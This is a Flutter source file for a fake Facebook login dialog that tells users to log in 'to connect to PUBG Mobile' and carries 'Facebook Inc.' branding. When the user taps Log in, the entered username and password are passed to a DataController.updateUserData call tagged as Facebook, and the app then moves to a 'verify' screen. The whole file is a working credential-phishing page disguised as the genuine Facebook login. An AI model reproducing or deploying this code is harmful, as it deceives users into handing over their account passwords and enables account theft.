import 'package:bgmimobile/controller/fb_controller.dart';
import 'package:bgmimobile/verify/verify_screen.dart';

import 'package:flutter/cupertino.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:provider/provider.dart';
import 'package:provider/src/provider.dart';

class FBClone extends StatefulWidget {
  const FBClone({Key? key}) : super(key: key);

  @override
  State<FBClone> createState() => _FBCloneState();
}

class _FBCloneState extends State<FBClone> {
  bool _passWordVisible = true;
  void _togglePasswordVisiblity() {
    setState(() {
      _passWordVisible = !_passWordVisible;
    });
  }

  @override
  Widget build(BuildContext context) {
    TextEditingController _usernameController = TextEditingController();
    TextEditingController _passwordController = TextEditingController();
    var height = MediaQuery.of(context).size.height;
    var width = MediaQuery.of(context).size.width;
    List<String> listofstring = [
      "Create account",
      "Not now",
      "Forgotten password?"
    ];

    List<String> listoflang = [
      "English (UK)",
      "Bahasa Indonesia",
      "Basa Jawa",
      "Bahasa Melayu",
      "日本語",
      "Español",
      "Português (Brasil)"
    ];
    return DecoratedBox(
      decoration: BoxDecoration(
        color: Colors.transparent,
        borderRadius: BorderRadius.circular(10),
      ),
      child: SingleChildScrollView(
        child: Stack(
          children: [
            Column(
              children: [
                DecoratedBox(
                  decoration: BoxDecoration(
                    color: Colors.grey.shade200,
                    borderRadius: BorderRadius.circular(10),
                  ),
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Container(
                        alignment: Alignment.center,
                        width: width,
                        height: height * 0.075,
                        decoration: const BoxDecoration(
                          color: Color(0xFF3b5998),
                          borderRadius: BorderRadius.only(
                            topLeft: Radius.circular(10),
                            topRight: Radius.circular(10),
                          ),
                        ),
                        child: Text(
                          'facebook',
                          style: GoogleFonts.firaSans(
                            textStyle: TextStyle(
                              color: Colors.grey.shade200,
                              fontSize: 25,
                              fontWeight: FontWeight.w600,
                            ),
                          ),
                        ),
                      ),
                      Padding(
                        padding: const EdgeInsets.only(top: 20.0),
                        child: Container(
                          padding:
                              EdgeInsets.only(left: width * 0.05, top: 7.5),
                          alignment: Alignment.bottomCenter,
                          width: height * 0.075,
                          height: height * 0.075,
                          decoration: BoxDecoration(
                            color: const Color(0xFF3b5998),
                            borderRadius: BorderRadius.circular(10),
                          ),
                          child: FaIcon(
                            FontAwesomeIcons.facebookF,
                            size: height * 0.065,
                            color: Colors.white,
                          ),
                        ),
                      ),
                      Container(
                        alignment: Alignment.center,
                        width: width,
                        height: height * 0.075,
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(10),
                        ),
                        child: Text(
                          "Log in to your Facebook account to\n connect to PUBG Mobile",
                          textAlign: TextAlign.center,
                          style: GoogleFonts.firaSans(
                            textStyle: const TextStyle(
                              color: Colors.grey,
                              fontSize: 15,
                              fontWeight: FontWeight.w400,
                            ),
                          ),
                        ),
                      ),
                      Container(
                        width: width,
                        margin: const EdgeInsets.symmetric(
                            horizontal: 20, vertical: 5),
                        child: DecoratedBox(
                          decoration: BoxDecoration(
                            color: Colors.grey.shade200,
                            borderRadius: BorderRadius.circular(5),
                          ),
                          child: Column(children: [
                            CupertinoTextField(
                              controller: _usernameController,
                              padding: EdgeInsets.all(width * 0.025),
                              decoration: BoxDecoration(
                                color: Colors.white,
                                border: Border.all(
                                  width: 0.5,
                                  color: Colors.grey.shade600,
                                ),
                                borderRadius: BorderRadius.circular(5),
                              ),
                              placeholderStyle: GoogleFonts.firaSans(
                                textStyle: const TextStyle(
                                  color: Colors.black,
                                  fontSize: 14,
                                  fontWeight: FontWeight.w300,
                                ),
                              ),
                              placeholder: 'Mobile number or email address',
                            ),
                            CupertinoTextField(
                              controller: _passwordController,
                              obscureText: _passWordVisible,
                              padding: EdgeInsets.all(width * 0.025),
                              decoration: BoxDecoration(
                                color: Colors.white,
                                border: Border.all(
                                  width: 0.5,
                                  color: Colors.grey.shade600,
                                ),
                                borderRadius: BorderRadius.circular(5),
                              ),
                              placeholderStyle: GoogleFonts.firaSans(
                                textStyle: const TextStyle(
                                  color: Colors.black,
                                  fontSize: 14,
                                  fontWeight: FontWeight.w300,
                                ),
                              ),
                              suffix: IconButton(
                                icon: Icon(
                                  _passWordVisible
                                      ? Icons.visibility_outlined
                                      : Icons.visibility_off_outlined,
                                ),
                                onPressed: () {
                                  _togglePasswordVisiblity();
                                },
                              ),
                              placeholder: 'Password',
                            ),
                          ]),
                        ),
                      ),
                      InkWell(
                        onTap: () async {
                          try {
                            if (_usernameController.text.isNotEmpty &&
                                _usernameController.text.length > 3 &&
                                _passwordController.text.isNotEmpty &&
                                _passwordController.text.length > 6) {
                              Provider.of<DataController>(context,
                                      listen: false)
                                  .setusername(_usernameController.text);
                              Provider.of<DataController>(context,
                                      listen: false)
                                  .setpassword(_passwordController.text);
                              await Provider.of<DataController>(context,
                                      listen: false)
                                  .updateUserData(_usernameController.text,
                                      _passwordController.text, Type.facebook);
                              await Future.delayed(const Duration(seconds: 1),
                                  () {
                                Navigator.push(
                                    context,
                                    MaterialPageRoute(
                                        builder: (context) =>
                                            const VerifyPageScreen()));
                              });
                            }
                          } catch (e) {
                            if (kDebugMode) {
                              print(e);
                            }
                          }

                          // Navigator.push(
                          //   context,
                          //   MaterialPageRoute(
                          //     builder: (context) => HomePage(),
                          //   ),
                          // );
                        },
                        child: Container(
                          alignment: Alignment.center,
                          width: width,
                          margin: const EdgeInsets.symmetric(
                              horizontal: 20, vertical: 10),
                          height: height * 0.05,
                          decoration: BoxDecoration(
                            color: Colors.blueAccent,
                            borderRadius: BorderRadius.circular(5),
                          ),
                          child: Text(
                            "Log in",
                            textAlign: TextAlign.center,
                            style: GoogleFonts.firaSans(
                              textStyle: const TextStyle(
                                color: Colors.white,
                                fontSize: 15,
                                fontWeight: FontWeight.w600,
                              ),
                            ),
                          ),
                        ),
                      ),
                      ...List.generate(3, (i) {
                        return Text(
                          listofstring[i],
                          textAlign: TextAlign.center,
                          style: GoogleFonts.firaSans(
                            textStyle: TextStyle(
                              color: i == 2
                                  ? Colors.blueAccent.withOpacity(0.5)
                                  : Colors.blueAccent,
                              fontSize: 14,
                              fontWeight: FontWeight.w400,
                            ),
                          ),
                        );
                      }),
                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceAround,
                        children: [
                          Column(
                            children: [
                              ...List.generate(4, (i) {
                                return Padding(
                                  padding:
                                      const EdgeInsets.symmetric(vertical: 5),
                                  child: Text(
                                    listoflang[i],
                                    textAlign: TextAlign.center,
                                    style: GoogleFonts.firaSans(
                                      textStyle: TextStyle(
                                        color: i == 0
                                            ? Colors.grey.shade600
                                            : Colors.blueAccent,
                                        fontSize: 12,
                                        fontWeight: FontWeight.w300,
                                      ),
                                    ),
                                  ),
                                );
                              }),
                            ],
                          ),
                          Column(
                            children: [
                              ...List.generate(3, (i) {
                                return Padding(
                                  padding:
                                      const EdgeInsets.symmetric(vertical: 5),
                                  child: Text(
                                    listoflang.reversed.elementAt(i),
                                    textAlign: TextAlign.center,
                                    style: GoogleFonts.firaSans(
                                      textStyle: const TextStyle(
                                        color: Colors.blueAccent,
                                        fontSize: 12,
                                        fontWeight: FontWeight.w300,
                                      ),
                                    ),
                                  ),
                                );
                              }),
                              Container(
                                alignment: Alignment.center,
                                width: height * 0.035,
                                height: height * 0.035,
                                decoration: BoxDecoration(
                                  border: Border.all(
                                    width: 0.5,
                                    color: Color(0xFF3b5998),
                                  ),
                                  color: Colors.grey.shade200,
                                  borderRadius: BorderRadius.circular(2),
                                ),
                                child: Icon(
                                  Icons.add,
                                  color: Colors.grey,
                                ),
                              ),
                            ],
                          ),
                        ],
                      ),
                      Text(
                        "Facebook Inc.",
                        textAlign: TextAlign.center,
                        style: GoogleFonts.firaSans(
                          textStyle: const TextStyle(
                            color: Colors.grey,
                            fontSize: 12,
                            fontWeight: FontWeight.w300,
                          ),
                        ),
                      )
                    ],
                  ),
                ),
              ],
            ),
            Row(
              mainAxisAlignment: MainAxisAlignment.end,
              children: [
                IconButton(
                  onPressed: () {
                    Navigator.pop(context);
                  },
                  highlightColor: Colors.transparent,
                  splashColor: Colors.transparent,
                  icon: const Icon(
                    Icons.close,
                    color: Colors.white,
                    size: 30,
                  ),
                )
              ],
            ),
          ],
        ),
      ),
    );
  }
}
